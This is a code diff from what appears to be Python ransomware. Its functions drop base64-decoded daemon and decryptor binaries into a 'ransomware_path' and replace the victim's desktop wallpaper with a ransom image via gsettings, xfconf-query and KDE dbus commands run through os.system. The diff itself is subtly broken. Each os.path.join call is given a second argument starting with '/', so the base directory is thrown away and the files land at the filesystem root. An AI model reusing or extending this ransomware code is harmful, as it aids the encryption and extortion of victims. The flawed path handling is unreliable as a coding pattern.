@@ -161,7 +161,7 @@ def drop_daemon_and_decryptor():
               'wb') as f:
         f.write(base64.b64decode(variables.decryptor))
 
-    with open(variables.ransomware_path + "/daemon", 'wb') as f:
+    with open(os.path.join(variables.ransomware_path, "/daemon"), 'wb') as f:
         f.write(base64.b64decode(variables.daemon))
 
     os.chdir(variables.ransomware_path)
@@ -177,13 +177,13 @@ def change_wallpaper():
               'wb') as f:
         f.write(base64.b64decode(variables.img))
     gnome = 'gsettings set org.gnome.desktop.background picture-uri {}'\
-            .format(variables.ransomware_path + "/img.png")
+            .format(os.path.join(variables.ransomware_path, "/img.png"))
     
     xfce = '''xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s "{}" ''' \
-            .format(variables.ransomware_path + "/img.png")
+            .format(os.path.join(variables.ransomware_path, "/img.png"))
     
     xfce1 = 'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor1/workspace0/last-image -s "{}"' \
-            .format(variables.ransomware_path + "/img.png")
+            .format(os.path.join(variables.ransomware_path, "/img.png"))
 
     kde = """dbus-send --session --dest=org.kde.plasmashell --type=method_call /PlasmaShell org.kde.PlasmaShell.evaluateScript 'string:
 var Desktops = desktops();                                                                                                                       
@@ -195,7 +195,7 @@ for (i=0;i<Desktops.length;i++) {
                                     "General");
         d.writeConfig("Image", "file://%s");
 }'
-""" %(variables.ransomware_path + "/img.png")
+""" %(os.path.join(variables.ransomware_path, "/img.png"))
 
     os.system(gnome)
     os.system(xfce)
